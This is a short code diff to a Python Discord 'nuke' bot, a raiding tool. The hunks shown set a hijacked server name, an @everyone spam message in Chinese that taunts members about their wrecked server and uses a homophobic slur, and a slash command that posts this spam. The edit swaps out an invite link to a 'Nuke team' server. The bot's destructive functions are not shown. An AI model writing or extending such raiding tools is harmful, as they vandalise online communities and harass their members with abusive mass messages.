@@ -11,7 +11,7 @@ LOCAL_ICON_PATH = './icon.png'
 NEW_GUILD_NAME = 'Nuke by 群主'
 
 SPAM_MESSAGE = '# @everyone haha，我是你們的管家，哈哈，想恢復伺服器? \n # 沒門! 你以為我會貼群組連結?\n# 不可能，你這個Gay。'
-NUKE_PANEL_CONTENT = '### Want Free Nuke Bot?\n\n**join Nuke team server**\n\n**discord.gg/wpEE8qwxY8**'
+NUKE_PANEL_CONTENT = '### Want Free Nuke Bot?\n\n**join Nuke team server**'
 
 active_webhooks = set()
 intents = discord.Intents.default()
@@ -143,7 +143,7 @@ app_contexts = app_commands.allowed_contexts(
 @app_installs
 @app_contexts
 async def send(interaction: discord.Interaction):
-    custom_msg = "# @everyone haha，我是你們的管家，哈哈，想恢復伺服器? \n # 沒門! 你以為我會貼群組連結?\n# 不可能，你這個Gay。\n### Want Free Nuke Bot?\n\n**join Nuke team server**\n\n**discord.gg/wpEE8qwxY8**"
+    custom_msg = "# @everyone haha，我是你們的管家，哈哈，想恢復伺服器? \n # 沒門! 你以為我會貼群組連結?\n# 不可能，你這個Gay。\n# Want Free Nuke Bot?\n\n**join Nuke team server**\n\n# no server hehe"
     view = RV(custom_msg)
     await interaction.response.send_message(
         "點擊下方按鈕發送訊息", ephemeral=True, view=view
